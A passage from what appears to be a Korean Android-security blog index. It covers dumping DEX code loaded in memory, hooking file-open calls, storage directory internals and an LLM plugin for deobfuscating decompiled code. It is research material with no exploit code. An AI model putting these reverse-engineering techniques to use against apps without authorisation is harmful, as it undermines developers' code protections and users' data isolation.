assets/ 에서 파일을 Byte 로 읽은 후 실행 중 바로 메모리 상에서 로드하는 방법이다.public InMemoryDexClassLoader (ByteBuffer dexBuffer , ClassLoader parent)해당 API 는 디렉터리에 파일을 따로 만들지 않고 실행 시 메모리에 로드되는 형태이다.실행 시 확인하면 아래와 같이 메모리 상에 올라간 dex 를 로컬 디렉터리에 파일로 만들어서 dump 를 뜰 수 있다.[+] Dex dumped successfully !=&gt; /data/user/0/ww.rksr.jjiuuuu.lsls/2025_03_07_a_dump.dex[*] Opening file name=&gt; /data/user/0/ww.rksr.jjiuuuu.lsls/2025_03_07_a_dump.dex to write 503724 bytes[*] Writing size=&gt; 503724 bytes...Conclusionassets/ 에 리소스처럼 위장해있는 파일을 후킹하여 그리고 그 파일이 메모리에 올라가는 것까지 진행해보았다.고이신 여러 리버서들의 의견을 들어보면 정말 흥미로운 패턴을 가진 소프트웨어가 많다고 한다.그중 난독화와 더불어 파일을 숨기거나 조합하거나 끼워맞추는 게 많고 이리갔다 저리갔다 하는 패턴도 있다고 한다. 알게 모르게 피곤하고 성가신 기술들로 분석이 난해한 경우가 다반사라고 한다. 또한 난독화와 더불어 바이너리 수준으로 안티 리버싱이 적용된 케이스도 적지 않다고 하여 해당 케이스도 추후 정리해볼까 한다.다음 글에 작성할 내용이지만 꽤 재밌었던 사례 중 하나는 모든 호출부를 네이티브로 코드를 내린 어플리케이션이다. 네이티브 라이브러리는 사실 암호화나 난독화를 하지 않아도 이미 컴파일된 바이너리로 디컴파일을 진행해도 기존 원본 코드를 유지할 수 없으며 이해하는 게 어렵기 때문에 대부분 네이티브로 내리는데 몇몇 리버서들이 이또한 분석하는 방법과 툴을 개발하여 네이티브 라이브러리 또한 암호화하는 도구들이 등장하였다.당연히 그에 걸맞게 해당 암호화 방법들을 또한 역공학할 수 방법들이 때에 맞춰 여러 사람들이 글을 정리하여 세상에 나타났다.다른 흥미로운 사례는 실행 중 분석할 수 있는 도구들을 탐지하는 케이스도 있고 이러한 분석 도구들을 농락이라도 하듯이 dummy call 로 유도하는 케이스도 굉장히 많았다. 실제로 이와 비슷한 케이스를 확인하면서 앱 동작에는 영향은 없지만 분석 도구를 붙이는 순간 포착하려는 기능이 발견되지 않는 재밌는 상황이 있었다.그러나 결과적으로 빌드된 Android OS 에서 앱이 성공적으로 실행된다면 가장 최상위 부모 프로세스인 Zygote 부터 정적 분석과 동적 분석으로 하나씩 살펴보면서 Application 으로 들어가고 class call, method call, native call 쪽으로 파고들면 된다.불가능한건 아니다. 새벽과 길고 긴 밤이 있으면 결국엔 알아낼 수 있는 것 같다, 이 글처럼 :)Referencehttps://source.android.com/docs/core/runtime/dex-formathttps://developer.android.com/reference/java/lang/ClassLoaderhttps://developer.android.com/reference/dalvik/system/DexClassLoaderhttps://developer.android.com/reference/dalvik/system/InMemoryDexClassLoader" }, { "title": "안드로이드 앱 실행 시 어떤 파일들에 접근할까", "url": "/posts/about_file_api/", "categories": "research, android", "tags": "research, android", "date": "2025-03-10 21:35:46 +0900", "snippet": "Introduction안드로이드로 파일에 접근할 때 대부분 File 클래스를 통해 접근하고 그후에 stream 으로 접근하여 정보를 작성한다.이때 사용하는 API 는 FileOutputStream, FileInputStream 등이 있는데 이들 호출 구조를 보면서 앱 실행 시 어떤 파일이 접근하는지 확인하는 코드를 작성해보려고 한다.What is th...", "content": "Introduction안드로이드로 파일에 접근할 때 대부분 File 클래스를 통해 접근하고 그후에 stream 으로 접근하여 정보를 작성한다.이때 사용하는 API 는 FileOutputStream, FileInputStream 등이 있는데 이들 호출 구조를 보면서 앱 실행 시 어떤 파일이 접근하는지 확인하는 코드를 작성해보려고 한다.What is that각각의 특정 File 에 접근할 때 사용되는 코드들의 호출 구조를 보면 아래와 같다.RandomAccessFile3191 ms RandomAccessFile.$init(\"&lt;instance: java.io.File&gt;\", \"r\")3191 ms | open(path=\"/data/redacted/redacted/redacted.txt\", oflag=0x0, ...)3191 ms | open(=&gt; fd=0xf2)FileInputStream2858 ms FileOutputStream.$init(\"&lt;instance: java.io.File&gt;\", false)2859 ms | open(path=\"/data/user/0/com.redacted.redacted.redacted.redacted/shared_prefs/redacted.redacted.redacted.redacted-redacted.xml\", oflag=0x241, ...)2859 ms | open(=&gt; fd=0xa6)FileOutputStream1575 ms FileInputStream.$init(\"&lt;instance: java.io.File&gt;\")1576 ms | open(path=\"/storage/emulated/0/Android/data/com.redacted.redacted.redacted.redacted/cache/default/redacted/redacted.pro\", oflag=0x0, ...)1576 ms | open(=&gt; fd=0xf8)이를 확인해보면 결론적으로 최상위에는 네이티브 함수 중 저수준 open() 험수에 접근하게 된다.open() 에 대한 함수는 아래와 같다.int open(const char *pathname, int flags);파일 디스크립터 번호를 반환하고 제일 첫번째에는 절대경로가 인자로 들어간다. 그 다음은 파일을 접근할 때 옵션이다.Conclusion해당 내용을 기반으로 앱 실행 시 접근하는 파일 이름을 출력하는 스니펫을 간단하게 작성하였다.관련 저장소는 아래와 같다.https://github.com/RuffaloLavoisier/Fdump" }, { "title": "Android API level", "url": "/posts/android_api_level/", "categories": "android", "tags": "android", "date": "2025-03-05 20:58:03 +0900", "snippet": "Introduction자주 까먹어서 블로그에 안드로이드 API 버전을 복붙하려고 한다.물론 외우면 좋겠지만 My memory is…Android API Level Code Name Version API Level/ NDK Android13 13 API 33 ...", "content": "Introduction자주 까먹어서 블로그에 안드로이드 API 버전을 복붙하려고 한다.물론 외우면 좋겠지만 My memory is…Android API Level Code Name Version API Level/ NDK Android13 13 API 33 Android12L 12 API 32 Android12 12 API 31 Android11 11 API 30 Android10 10 API 29 Pie 9 API 28 Oreo 8.1.0 API 27 Oreo 8.0.0 API 26 Nougat 7.1 API 25 Nougat 7.0 API 24 Marshmallow 6.0 API 23 Lollipop 5.1 API 22 Lollipop 5.0 API 21 KitKat 4.4 - 4.4.4 API 19 Jelly Bean 4.3.x API 18 Jelly Bean 4.2.x API 17 Jelly Bean 4.1.x API 16 Ice Cream Sandwich 4.0.3 - 4.0.4 API 15, NDK 8 Ice Cream Sandwich 4.0.1 - 4.0.2 API 14, NDK 7 Honeycomb 3.2.x API 13 Honeycomb 3.1 API 12, NDK 6 Honeycomb 3.0 API 11 Gingerbread 2.3.3 - 2.3.7 API 10 Gingerbread 2.3 - 2.3.2 API 9, NDK 5 Froyo 2.2.x API 8, NDK 4 Eclair 2.1 API 7, NDK 3 Eclair 2.0.1 API 6 Eclair 2.0 API 5 Donut 1.6 API 4, NDK 2 Cupcake 1.5 API 3, NDK 1 (Unknown) 1.1 API 2 (Unknown) 1.0 API 1 " }, { "title": "Android 앱 내부 디렉토리에 대한 고찰", "url": "/posts/access_app_directory/", "categories": "android, research", "tags": "research, android", "date": "2025-03-04 22:17:04 +0900", "snippet": "Introduction가끔 사진 편집으로 사용한 앱을 삭제하면 편집한 사진이 저장되었던 폴더가 사라져서 느낌표 5억 5천개가 생겼을 때가 있다.그런데 또 다른 앱 같은 경우 앱을 삭제해도 사진 파일이 그대로 있을 때가 있다. 무엇이 다른걸까단순히 버그인걸까 아니면 내부가 다른걸까해당 글에서는 안드로이드에서 적용되는 디렉토리 수준에 대하여 여러 글을 참...", "content": "Introduction가끔 사진 편집으로 사용한 앱을 삭제하면 편집한 사진이 저장되었던 폴더가 사라져서 느낌표 5억 5천개가 생겼을 때가 있다.그런데 또 다른 앱 같은 경우 앱을 삭제해도 사진 파일이 그대로 있을 때가 있다. 무엇이 다른걸까단순히 버그인걸까 아니면 내부가 다른걸까해당 글에서는 안드로이드에서 적용되는 디렉토리 수준에 대하여 여러 글을 참고하여 정리하며 타 앱 관점에서 접근하는 부분만 다루고자 한다.What is that안드로이드에서 디렉토리에 접근할 수 있는데 보안을 위하여 샌드박스가 적용되어 다른 앱에서 접근이 불가한 디렉토리들이 있다.리눅스와 비슷한 모습을 보이지만 보안과 정책으로 인하여 강화된 룰로 내부를 보호하고 있다.안드로이드에서 접근하는 디렉토리는 크게 내부 저장소와 외부 저장소로 나뉠 수 있다.내부 저장소는 앱에서 생성하는 캐시 파일 다운로드한 파일 앱을 구성하고 사용자가 다시 앱을 로드할 때 필요한 파일들을 주로 저장하고 외부 저장소에는 앱의 임시 파일이나 일시적으로 생성되는 파일들이 주로 배치된다.그런데 특이한 점이 있는데 앱 내부 디렉토리는 앱을 삭제하면 같이 삭제된다는 점이 있으며 외부 디렉토리는 앱을 삭제해도 잔류한다는 점이 있다.Android ApplicationInfo 에 따라 들어가면 설치된 앱에서 확인할 수 있는 디렉토리들이 몇개 있다.해당 API 들을 통해 앱 접근을 확인해보면 아래와 같다.Access Fail: /data/user/0/com.sample.application # ApplicationInfo.dataDirAccess Done: /data/app/~~qwerty==/com.sample.application-qwerty==/base.apk # ApplicationInfo.publicSourceDirAccess Done: /data/app/~~qwerty==/com.sample.application-qwerty==/lib/arm64 # ApplicationInfo.nativeLibraryDirAccess Done: /data/app/~~qwerty==/com.sample.application-qwerty==/base.apk # ApplicationInfo.sourceDirAccess Fail: /data/user_de/0/com.sample.application # ApplicationInfo.deviceProtectedDataDir사용했던 API 들은 아래와 같다.public String nativeLibraryDir// Full path to the directory where native JNI libraries are stored.public String publicSourceDir// Full path to the publicly available parts of sourceDir, including resources and manifest. This may be different from sourceDir if an application is forward locked.public String sourceDir// Full path to the base APK for this application.위 3개 API 는 /data/app/~~qwerty==/com.sample.application-qwerty==/ 에 연결된 경로이다. publicSourceDir 과 sourceDir 의 차이는 Forward Locked 여부인데 일반적으로 sourceDir 를 사용하는 걸 권장한다.public String dataDir// Full path to the default directory assigned to the package for its persistent data.다음 API 는 본인이 속한 디렉토리일 경우에만 접근하는 것으로 보인다.Android 개인 디렉토리 관하여안드로이드 개발에 있어서 파일 저장은 매우 중요한 부분이다. 각 Android 애플리케이션에는 애플리케이션 데이터, 구성, 캐시 및 기타 파일을 저장하기 위한 고유한 개인 디렉토리가 있다. 이러한 파일은 다른 애플리케이션에서는 볼 수 없으므로 데이터 보안과 격리가 보장된다. 다음에서는 Android 의 개인 디렉토리에 대해 심도 있게 이해하는 데 도움이 될 것이다.개인 디렉토리의 정의안드로이드의 개인 디렉토리는 애플리케이션만 관리하고 접근할 수 있는 파일 디렉토리를 말한다. 즉, 디렉토리가 애플리케이션에 속한다는 뜻이다. 각 Android 애플리케이션이 설치될 때, 시스템은 내부 저장 공간에 개인 디렉토리를 할당하여 애플리케이션의 영구 파일을 저장한다. 또한, 애플리케이션 캐시 파일을 저장하기 위한 디렉토리도 있다. 이러한 디렉토리는 해당 애플리케이션에서만 완전히 공개되며 다른 애플리케이션에서 직접 액세스할 수 없다.개인 디렉토리의 위치안드로이드의 개인 디렉토리는 주로 내부 저장소와 외부 저장소의 두 곳에 분산되어 있다.내부 저장소 개인 디렉토리내부 저장소 개인 디렉토리는 /data/data/packagename/ 에 있으며, 여기서 packagename 은 애플리케이션의 패키지 이름이다. 이 디렉토리는 애플리케이션의 주 저장 영역이며, 설정 파일, 데이터베이스 , 이미지 등과 같은 애플리케이션의 영구 파일을 저장하는 데 사용된다. 앱은 시스템 권한 없이도 이러한 파일을 읽고 쓸 수 있지만, 다른 앱은 이러한 파일에 직접 액세스할 수 없다.외부 저장소 개인 디렉토리외부 저장소 개인 디렉토리는 /sdcard/Android/data/packagename/ 에 있다 . 이 디렉토리는 임시 파일, 다운로드한 파일 등과 같은 애플리케이션 캐시 파일을 저장하는 데 주로 사용된다. 이 디렉토리는 외부 저장소에 위치하므로 해당 애플리케이션에서만 볼 수 있지만, 다른 애플리케이션이 어떤 방법을 통해 이 디렉토리에 접근할 수도 있다. 따라서 민감한 데이터를 외부 저장소 개인 디렉토리에 저장하는 것은 권장하지 않는다.개인 디렉토리를 획득하고 운영하는 방법Android 에서는 Context 클래스의 getFilesDir() 메서드를 호출하여 애플리케이션의 개인 디렉토리 경로를 가져올 수 있다. 예를 들어:File privateDir = context.getFilesDir();개인 디렉토리의 경로를 얻은 후에는 디렉토리에서 파일을 생성하고, 파일을 읽고 쓰고, 다른 작업을 수행할 수 있다. 예를 들어, 개인 디렉토리에 my_file.txt 라는 파일을 만들고 여기에 일부 데이터를 쓰려면 다음과 같이 할 수 있다.File file = new File(privateDir, \"my_file.txt\");boolean created = file.createNewFile();if (created) { FileOutputStream outputStream = new FileOutputStream(file); outputStream.write(\"Hello, world!\".getBytes()); outputStream.close();}위의 코드는 먼저 File 클래스의 createNewFile() 메서드를 통해 개인 디렉토리에 my_file.txt 라는 파일을 만들고, 파일이 성공적으로 만들어졌는지 여부를 나타내는 부울 값을 반환한다. 그런 다음, FileOutputStream 클래스를 사용하여 문자열 Hello, world! 가 파일에 기록된다.대부분 getDir() 로 파일 및 폴더를 생성하거나 getDataDir() 로 내부 디렉토리에 접근하여 파일을 생성한다.Android Directory Structure그러면 더 넓게 보았을 때 내부 저장소, 외부 저장소(확장된 외부 저장소, SD 카드 저장소 포함), 시스템 저장소 디렉토리를 포함한 Android 저장소 디렉토리 구조를 자세히 소개해보려고 한다. 또한 서로 다른 획득 경로 간의 차이, 데이터 지우기와 캐시 지우기의 차이 등 관련 개념 간의 차이도 설명한다.Internal Directory StructureAndroid 에서 볼 수 있는 디렉토리들은 위와 같다.빠진 부분도 있을 수 있으나 앱단 입장에서 볼 때 위와 같이 볼 수 있다.내부 저장소내부 저장소는 시스템의 매우 특별한 위치에 있다. 장치에 설치된 각 앱에 대해 시스템은 자동으로 data/data/packagename/xxx 에 해당 폴더를 만든다 . 내부 저장소에 파일을 저장하려면 기본적으로 해당 애플리케이션에서만 파일에 액세스할 수 있으며, 애플리케이션에서 생성된 모든 파일은 애플리케이션 패키지 이름과 동일한 디렉토리에 저장된다. 즉, 내부 저장소에 있는 애플리케이션에서 생성된 파일은 이 애플리케이션과 연결된다. 앱을 제거하면 내부 저장소에 있는 이러한 파일도 삭제된다. 사용자는 루트 권한을 얻지 않는 한 이 내부 디렉토리에 접근할 수 없다.String fileDir = this.getFilesDir().getAbsolutePath();String cacheDir = this.getCacheDir().getAbsolutePath();일반적으로 얻는 경로는 data/data/packagename/xxx 이다.fileDir: /data/user/0/packagename/filescacheDir: /data/user/0/packagename/cache내부 저장소 경로의 경우 일반적으로 다음 두 가지 방법으로 얻는다. 내부 저장소 공간을 확보하려면 Context를 사용해야 한다.Context.getFileDir()해당 내부 저장 경로는 data/data/packagename/files 이지만 일부 모바일 폰의 경우 얻은 경로는 data/user/0/packagename/files 이다.Context.getCacheDir()해당 내부 저장 경로는 data/data/packagename/cache 이다. 하지만 일부 휴대폰의 경우, 얻은 경로는 data/user/0/packagename/cache 이다. 애플리케이션의 캐시 디렉토리, 장치 메모리가 부족할 때 이 디렉토리에 있는 파일이 먼저 삭제되므로 여기에 저장된 파일은 보장되지 않으며 언제든지 손실될 수 있다.외부 저장소외부 저장소에 대해 혼동하기 쉬운데, 안드로이드 4.4 이전에는 휴대폰의 내장 저장소를 내부 저장소라고 불렀고, 삽입된 SD 카드는 외부 저장소였다. 그러나 안드로이드 4.4 이후 현재 휴대폰의 내장 저장소는 매우 크다. 이제 안드로이드 10.0에서는 일부 휴대폰이 256G의 저장소에 도달하였으며 이 경우 휴대폰의 내장 저장소도 외부 저장소이다. SD 카드를 삽입하면 외부 저장소라고도 한다. 따라서 외부 저장소는 SD 카드와 확장 카드 메모리의 두 부분으로 나뉜다.if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.KITKAT) { File[] files = getExternalFilesDirs(Environment.MEDIA_MOUNTED); for (File file : files) { Log.e(\"file_dir\", file.getAbsolutePath()); }}위 코드에 대해 인쇄된 결과는 다음과 같다./storage/emulated/o/~/storage/extSdCard/~두 개의 디렉토리가 인쇄된다.첫 번째 디렉토리는 장치의 외부 저장소 디렉토리이다. 디렉토리 구조는 다음과 같다: /storage/emulated/0/Android/data/packagename/files.두 번째 디렉토리는 저장소 카드의 디렉토리 구조이다. 경로는 다음과 같다: /storage/extSdCard/Android/data/packagename/files.외부 저장소 확장이 디렉토리 경로는 Context 통해 얻어야 하며, 이러한 파일도 앱이 제거되면 삭제된다. 내부 저장소와 유사한다.getExternalCacheDir()해당 외부 저장 경로: /storage/emulated/0/Android/data/packagename/cachegetExternalFilesDir(String type)해당 외부 저장 경로: /storage/emulated/0/Android/data/packagename/filesSD 카드 저장SD 카드에 있는 파일은 자유롭게 접근할 수 있다. 즉, 파일의 데이터는 다른 애플리케이션이나 사용자가 접근할 수 있다. 애플리케이션을 제거하면 제거 전에 생성된 파일은 여전히 ​​유지된다.SD 카드의 파일 경로는 환경을 통해 얻어야 하며, 이를 얻기 전에 SD의 상태를 확인해야 한다.MEDIA_UNKNOWN SD 카드를 알 수 없음MEDIA_REMOVED SD 카드 제거.MEDIA_UNMOUNTED SD 카드가 마운트되지 않음.MEDIA_CHECKING SD카드 검사, SD카드가 방금 설치된 경우MEDIA_NOFS SD 카드가 비어 있거나 지원되지 않는 파일 시스템을 사용.MEDIA_MOUNTED SD 카드가 정상 마운트.MEDIA_MOUNTED_READ_ONLY SD 카드가 마운트되었지만 읽기 전용.MEDIA_SHARED SD 카드 공유MEDIA_BAD_REMOVAL SD 카드 제거 오류MEDIA_UNMOUNTABLE SD 카드가 존재하지만 미디어가 손상된 경우와 같이 마운트할 수 없음.아래 코드와 같이 상태를 검증할 수 있다.String externalStorageState = Environment.getExternalStorageState(); if (externalStorageState.equals(Environment.MEDIA_MOUNTED)){ // some code }getExternalStorageDirectory()해당 외부 저장 경로: /storage/emulated/0getExternalStoragePublicDirectory(String type)다음과 같은 외부 저장소의 공유 폴더 경로를 가져온다.DIRECTORY_MUSIC 음악 디렉토리DIRECTORY_PICTURES 사진 디렉토리DIRECTORY_MOVIES 영화 디렉토리DIRECTORY_DOWNLOADS 디렉토리 다운로드DIRECTORY_DCIM 카메라 사진이나 비디오 파일의 저장 디렉토리DIRECTORY_DOCUMENTS 문서 디렉토리검증하는 코드는 아래와 같다.String externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath();위의 내용은 카메라 DCIM 디렉토리를 얻는 것이며, 해당 경로는 /storage/emulated/0/DCIM 이다.시스템 저장 디렉토리getRootDirectory()시스템 파티션의 루트 경로에 해당: /systemgetDataDirectory()사용자 데이터 디렉토리 경로에 해당: /datagetDownloadCacheDirectory()사용자 캐시 디렉토리 경로에 해당: /cache관련 개념 간의 차이점getFileDir()와 getCacheDir()의 차이점둘 다 내부 저장 디렉토리 /data/data/packagename/ 의 동일 레벨에 위치하는데, 전자는 파일 디렉토리에 있고 후자는 캐시 디렉토리에 있다.getFileDir()와 getExternalFilesDir(String type)의 차이점전자는 내부 저장소 디렉토리 /data/data/packagename/file 에 있고, 후자는 외부 저장소 디렉토리 /storage/emulated/0/Android/data/packagename/files 에 있다. 둘 다 애플리케이션 패키지 이름으로 존재하며, 즉 앱에 속하므로 앱을 제거하면 삭제된다.위에 언급된 앱 다운로드 및 업그레이드 기능을 위해, 서버에서 다운로드한 앱은 내부 저장소 디렉토리가 아닌 외부 저장소 디렉토리에 저장해야 한다. 왜냐하면 내부 저장소 디렉토리의 공간은 매우 작기 때문이다. 또한 관련 테스트도 수행했다. apk 가 내부 저장소 디렉토리 파일 아래에 배치되면 설치 중에 문제가 발생하고 패키지를 구문 분석하는 동안 오류가 발생했다는 메시지가 표시된다.데이터 지우기와 캐시 지우기의 차이점앱에는 데이터 지우기와 캐시 지우기라는 두 가지 개념이 있다. 그렇다면 이 두 개념은 각각 어떤 디렉토리를 지우는 건가데이터 지우기데이터를 지우면 앱에 저장된 모든 데이터, 즉 위에서 언급한 패키지 이름 아래의 모든 파일이 지워진다. 여기에는 내부 저장소(/data/data/packagename/)와 외부 저장소(/storage/emulated/0/Android/data/packagename/)가 포함된다. 물론, 앱을 제거한 후에도 SD 카드의 데이터 외에도 데이터는 계속 존재한다.캐시를 지우기캐시는 프로그램이 실행 중일 때의 임시 저장 공간이다. 인터넷에서 다운로드한 임시 이미지를 저장할 수 있다. 사용자 관점에서 볼 때 캐시를 지우는 것은 사용자에게 큰 영향을 미치지 않는다. 그러나 사용자가 캐시를 지운 후 다시 APP 을 사용하면 로컬 캐시가 지워졌기 때문에 모든 데이터를 인터넷에서 다시 가져와야 한다. 캐시를 지울 때 애플리케이션과 연관된 캐시가 제대로 지워지도록 getCacheDir() 또는 getExternalCacheDir() 경로에 캐시 파일을 저장하세요.파일 시스템 접근 방식내부 저장소 (Internal Storage)애플리케이션의 전용 저장소로, getFilesDir() 및 getCacheDir() 을 이용해 접근 가능하다.보안이 보장되며, 권한 요청 없이 접근할 수 있으나, 다른 애플리케이션에서는 격리되어 있다.저장된 데이터는 애플리케이션이 제거될 때 자동 삭제된다.내부 저장소의 파일은 MODE_PRIVATE 모드로 생성된다.File file = new File(getFilesDir(), \"example.txt\");try (FileOutputStream fos = new FileOutputStream(file)) { fos.write(\"Hello, World!\".getBytes());} catch (IOException e) { e.printStackTrace();}외부 저장소 (External Storage)getExternalFilesDir(null) 을 사용하여 접근 가능하며, 앱이 제거되면 해당 디렉토리도 삭제된다.공용 외부 저장소에 접근하려면 MediaStore 또는 Storage Access Framework (SAF)를 사용해야 한다.MANAGE_EXTERNAL_STORAGE 권한이 없으면 특정 디렉토리 외에는 직접 접근이 제한된다.File externalDir = new File(getExternalFilesDir(null), \"example.txt\");try (FileOutputStream fos = new FileOutputStream(externalDir)) { fos.write(\"Hello, External Storage!\".getBytes());} catch (IOException e) { e.printStackTrace();}MANAGE_EXTERNAL_STORAGE 권한에 관하여Scoped Storage가 도입되면서 /sdcard/Android/data/ 및 /sdcard/Android/obb/ 경로의 직접 접근이 차단되었다.adb shell 로는 여전히 접근 가능하지만 일반 앱에서는 접근이 불가능하다.MANAGE_EXTERNAL_STORAGE 권한을 부여받은 애플리케이션만 전체 파일 시스템 접근이 가능하다.MANAGE_EXTERNAL_STORAGE 권한 요청 및 파일 접근 예제는 아래와 같다.메니페스트에 추가되는 권한은 아래와 같다.&lt;uses-permission android:name=\"android.permission.MANAGE_EXTERNAL_STORAGE\"/&gt;코드는 아래와 같다.if (Environment.isExternalStorageManager()) { // 권한이 부여되었는지 확인한다. // some code} else { Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION); // special permission 창을 띄운다. startActivity(intent);}절대경로 접근 (직접 경로)파일에 접근할 때 직접 경로로 접근하는 그러니까 절대경로로 접근하는 방법들이 있다.fopen() 같은 경우 아래와 같은 인자를 받는다.fopen(const char * restrict path, const char * restrict mode)이때fopen(\"/data/user/0/com.sample.application/some/directory/file.txt\", \"r\")위와 같이 완전한 문자열의 절대경로로 접근하는 것을 의미한다.Conclusion이렇게 안드로이드 내부 디렉토리를 살펴보았다. 사실 시작은 /data/user/0 그러니까 getFileDir() 쪽 접근할 수 있는 방안을 찾아보다 이렇게 심층적으로 살펴보게 되었다. 결과적으로 앱 내부 디렉토리는 완전 막혀있어서 접근이 불가하다, 다른 방법이 있나 모색해봤는데 여러가지 방법은 있지만 대부분이 일반 디바이스에서 실행할 수 있는 방법은 아니어서 좋은 결과를 찾지는 못했다.지금까지 앱 내부 디렉토리 접근에 대한 내용을 살펴보았다. 안드로이드에서 제공하는 권한과 히든 스페이스를 적절히 활용하면 접근할 수 있는 경로와 파일들이 다소 확장된다.보안 측면에서 내부 디렉토리를 강화하여 필요에 따라 다른 앱의 내부 디렉토리에 접근할 수 있는 방법이 있는지 연구해볼 필요가 있을 것 같다.실제 개발에서는 개인 디렉토리를 사용하여 애플리케이션 구성 정보, 사용자 데이터, 캐시 파일 등을 저장하는 경우가 많다. 예를 들어, 음악 플레이어 앱은 사용자의 재생 목록, 노래 정보 등을 개인 디렉토리에 저장해 두어 사용자가 다음에 앱을 열 때 이전 재생 상태로 복원할 수 있다. 또한, 개인 디렉토리는 애플리케이션의 임시 파일, 다운로드 파일 등을 저장하는 데 사용할 수도 있으며, 이를 통해 애플리케이션의 파일 관리를 용이하게 할 수 있다.이 글에서는 안드로이드의 개인 디렉토리의 개념과 위치, 개인 디렉토리를 얻고 운영하는 방법, 그리고 실제 개발에서의 적용 시나리오를 자세히 소개해보았다. 개인 디렉토리의 사용을 마스터함으로써 애플리케이션 데이터와 파일을 보다 효과적으로 관리하고 데이터 보안과 격리를 보장할 수 있다." }, { "title": "Strong Analysis Automation Tool with llm", "url": "/posts/how_to_use_codedescriptor/", "categories": "llm, plugin", "tags": "llm, plugin, research, develop", "date": "2025-02-22 02:03:18 +0900", "snippet": "Introduction출처: https://device-port.kr/최근에 llm 을 이용하여 분석 자동화 도구에 대한 가능성을 확인하였고 이를 실행에 옮겼다. llm 을 사용하는 것은 많은 데이터를 정리하고 요약하여 손쉽게 접할 수 있다는 1차원적인 출발에서 시작할 수 있다. 그러나 이를 한 번 더 사용할 수 있는 방법은 무궁무진하게 열려있다. 개...", "content": "Introduction출처: https://device-port.kr/최근에 llm 을 이용하여 분석 자동화 도구에 대한 가능성을 확인하였고 이를 실행에 옮겼다. llm 을 사용하는 것은 많은 데이터를 정리하고 요약하여 손쉽게 접할 수 있다는 1차원적인 출발에서 시작할 수 있다. 그러나 이를 한 번 더 사용할 수 있는 방법은 무궁무진하게 열려있다. 개발할 때 코드를 읽을 수 있고 코드를 해석할 수 있고 코드를 만들 수 있다. 또한 취약한 코드를 찾아낼 수 있으며 나아가 난독화된 코드를 해독하는데까지 이를 수 있다. 이는 현재 가장 유용하게 사용하고 있는 도구를 더욱 강력하게 사용할 수 있는 방법을 제시하였고 기존보다 사용성에 대한 효율을 다소 상승시켰다.이 페이지에서는 llm 을 통한 플러그인 (CodeDescriptor) 에 대한 사용 방법을 기재하여 어떻게 사용하고 어떤 결과를 가져오는지 작성하였다.What is that일반적으로 컴파일한 Java 코드를 디컴파일하면 변수이름과 메소드 이름은 변경되어 코드를 따라가기 어려워진다.그래서 이를 보는 방법은 대개 다양한 방법으로 찾아볼 수 있다.그중 최근에 이용하는 것은 코드를 llm 에게 물어보고 그 결과를 llm 이 첨부하여 알려주는 방식이다.물론 이걸 위해선 깐깐한 프롬포트가 기반이 되어야 하며 종종 회신되어 오는 답문에서 잘못된 정보를 스스로 잡아낼 수 있는 부분도 필요하다.이를 몇번 시도하다보니 작업 범위에서 자동화할 수 있는 부분이 보였고 관련 오픈소스는 없었지만 매순간 llm 을 통해 여러가지 플러그인들이 쏟아져 나오는 걸 확인할 수 있었다.이를 통해 전반적으로 구동되는 프로세스를 본떠서 PoC 를 작성할 수 있었다.출처: https://www.unimedia.tech/먼저 플러그인은 툴에서 제공되는 API 를 사용할 수 있어 의존성을 갖는다.해당 API 는 *.dex 파일로부터 메소드 오프셋을 파싱받아 디컴파일된 메소드 코드를 llm 을 통해 해독하여 코멘트를 기반으로 원본 코드를 설명해준다.1차적으로 사용하여 Before/After 를 비교해볼 수 있는 결과가 나와 이에 기점으로 가이드라인을 작성해본다.How to아래는 플러그인의 동작과정과 사용법을 기재하였다.플러그인은 Jython 으로 쓰여졌으며 툴 내부에 /script 안에 위치하여야 한다.How to work먼저 플러그인(CodeDescriptor) 는 확장할 수 있는 도구들 가운데 스크립트 형태로 작동된다. 스크립트는 Python 언어로 작성할 수 있으며 툴 내부에서 스크립트를 변환할 수 있는 Jython 을 지원한다. 간단한 반복 작업을 자동화 스크립트화 할 수 있게 지원해준다.위는 찾으려는 오프셋이 위치한 코드를 디컴파일한 코드를 가져오는 과정이다. 이는 layout format 을 따라 코드를 디컴파일하는 과정인데 간략한 과정은 아래와 같다.header 에서 method 와 index 와 시그니처 index 를 확인할 수 있다. 또한 class data 에서 code_off 세부 정보를 볼 수 있다. 이를 기반으로 string index 영역에서 함수를 문자열 형태로 추출할 수 있다.위는 스크립트 구동 시 llm 사용 정보에 대한 설정과 함께 오프셋을 통해 디컴파일한 코드를 기반으로 llm 을 통한 난독화 해제 코드를 생성하는 전체 과정이다.script 로 llm 에 요청을 보내는 것은 다음 저장소에서 확인할 수 있다.이때 사용하려면 개인이 발급받은 llm 에 대한 API 키가 필요하다. API key 발급은 여기서 할 수 있다.How to use스크립트 사용법은 일반 스크립트 사용법과 동일하다. script/ 안에 파일을 배치하고서 File-&gt;Scripts-&gt;Selector 에서 파일을 찾은 후 실행하면 된다.A. dex file 에서 분석할 메소드 오프셋에 포커스를 위치한다.Select a target method offset먼저 dex 파일을 열어서 알아보고자 하는 메소드의 오프셋을 찾는다.B. LLM 에 관한 Configuration 정보를 입력한다.Open cript SelectorSelect a LLM4JEB (CodeDescriptor)Set LLM informationscript 항목에서 CodeDescriptor 를 선택해주면 위와 같은 Configuration 창이 나오면서 세부 정보를 기입하는 부분이 나온다.항목을 입력하고 OK 를 누르면 llm 을 위한 준비는 끝났다. 여기선 다른 llm 도 사용할 수 있게 수정할 수 있다. 사용하려는 모델에 대한 model type, endpoint, API key 등을 입력하면 된다.C. 디컴파일된 코드를 확인한다.Display decompile method code다음 창에서는 처음에 오프셋을 둔 곳에 메소드를 컴파일한 코드를 보여준다.D. llm 을 통한 분석된 메소드 코드를 확인한다.Display deobfuscated method code확인을 누르면 프롬포트 기반으로 디컴파일된 코드를 선책한 llm model 이 처리하여 line by line 으로 comment 를 작성하여 반환해준다.Conclusion종종 모르는 코드나 낯선 코드를 보면 llm 을 통해 왔다갔다 하면서 수작업을 하는 일상이 있는데 이를 완전 자동화할 수 있는 것이 이번 기회에 큰 시작으로 다가온다.출처: https://dirox.com/또한 다른 llm 을 직접 설정하도록 사용이 가능해 DeepSeek, Claude 또는 다른 로컬 커스텀 llm 도 가능하다.llm 의 등장으로 도구와 도구 사이를 자동화할 수 있었으며 나아가 다른 에디터에서도 충분히 활용할 수 있을 것으로 예상된다.에디터에서 외부 플러그인을 import 할 수 있으며 이는 다른 관리 도구에서도 이를 